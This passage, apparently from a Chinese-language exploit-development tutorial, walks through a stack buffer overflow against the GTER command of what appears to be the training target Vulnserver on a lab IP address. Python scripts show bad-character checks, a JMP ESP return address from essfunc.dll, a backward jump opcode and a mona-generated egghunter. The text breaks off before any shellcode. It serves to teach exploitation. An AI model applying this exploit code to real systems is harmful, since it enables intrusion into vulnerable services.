    #!/usr/bin/python
    import os
    import sys
    import socket
    host = "192.168.1.129"
    port = 9999
    buffer = ("\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
    "\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
    "\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
    buffer += "C"*(5000-len(buffer))
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host,port))
    print s.recv(1024)
    print "[*] Sending exploit..."
    s.send("GTER /.:/" + buffer)
    print s.recv(1024)
    s.close()
同样，从\xA0到\xFF都没有发现坏字符。因此，唯一的坏字符是 \x00。
我要做的下一件事就是确定一个包含JMP ESP指令的地址，这样我就可以将程序的执行重定向到C字符填充的缓冲区中。使用 !mona jmp -r esp -m
"essfunc.dll"，找到了0x625011AF这个地址。
代码又被修改为以下内容。
    #!/usr/bin/python
    import os
    import sys
    import socket
    host = "192.168.1.129"
    port = 9999
    buffer = "A"*147
    buffer += "\xAF\x11\x50\x62"        #JMP ESP 625011AF from essfunc.dll
    buffer += "C"*(5000-len(buffer))
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host,port))
    print s.recv(1024)
    print "[*] Sending exploit..."
    s.send("GTER /.:/" + buffer)
    print s.recv(1024)
    s.close()
发现这段代码能正常运行，EIP现在指向ESP，其中包含C字符填充的缓冲区。同样，20个字节也不足以容纳一个shellcode。通过观察堆栈，我发现A的缓冲区位于C的缓冲区的上方。虽然A的缓冲区（147字节）仍然不足以容纳一个shellcode，但这个空间将足以容纳一个egghunter。
在这之前，我首先需要将程序流重定向到A的起点。A字符的缓冲区开始于0x00B7F975，而C字符的缓冲区则位于0x00B7FA0C。它们之间的差异是0xFFFFFF69（-151字节）。因此，我必须要向后跳151个字节来到达A的缓冲区。
使用 !mona assemble -s "JMP 0xFFFFFF69"，我得到了JMP
0xFFFFFF69指令的等效操作码。这个操作码是好的，因为它不包含坏字符。
我然后修改代码进行执行。
    #!/usr/bin/python
    import os
    import sys
    import socket
    host = "192.168.1.129"
    port = 9999
    buffer = "A"*147
    buffer += "\xAF\x11\x50\x62"        # JMP ESP 625011AF from essfunc.dll
    buffer += "\xe9\x64\xff\xff\xff"    # JMP 151 bytes backwards to the start of A's
    buffer += "C"*(5000-len(buffer))
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host,port))
    print s.recv(1024)
    print "[*] Sending exploit..."
    s.send("GTER /.:/" + buffer)
    print s.recv(1024)
    s.close()
发现代码能正常使用了，我到达了A字符的起点。
既然一切都在按照我们的想法在进行，那么我就用 !mona egg -t Capt -cpb "apt/x00 " 生成一个 egghunter，标签为
Capt。 我还可以确保生成的 egghunter 不会有坏字符。
到目前为止一切都还正常，我尝试执行以下代码。
    #!/usr/bin/python
    import os
    import sys
    import socket
    host = "192.168.1.129"
    port = 9999
    # tag = Capt
    # 32 bytes
    egghunter = ("\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
    "\xef\xb8\x43\x61\x70\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")
    buffer = egghunter
    buffer += "A"*(147-len(buffer))
    buffer += "\xAF\x11\x50\x62"        # JMP ESP 625011AF from essfunc.dll